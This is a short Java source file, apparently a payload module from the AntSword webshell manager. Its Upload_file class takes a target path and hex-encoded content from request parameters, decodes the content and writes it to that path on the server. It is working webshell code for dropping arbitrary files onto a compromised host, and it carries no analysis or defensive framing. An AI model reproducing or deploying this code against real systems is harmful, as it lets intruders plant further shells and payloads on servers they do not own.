package filemanager;

import antSword.Template;

import java.io.File;
import java.io.FileOutputStream;

public class Upload_file extends Template {
    @Override
    public String run() throws Exception {
        String z1 = getParam("antswordargpath");
        String z2 = getParam("antswordargcontent");
        return UploadFileCode(z1, z2);

    }

    String UploadFileCode(String savefilePath, String fileHexContext) throws Exception {
        String h = "0123456789ABCDEF";
        File f = new File(savefilePath);
        f.createNewFile();
        FileOutputStream os = new FileOutputStream(f, true);
        for (int i = 0; i < fileHexContext.length(); i += 2) {
            os.write((h.indexOf(fileHexContext.charAt(i)) << 4 | h.indexOf(fileHexContext.charAt(i + 1))));
        }
        os.close();
        return "1";
    }
}
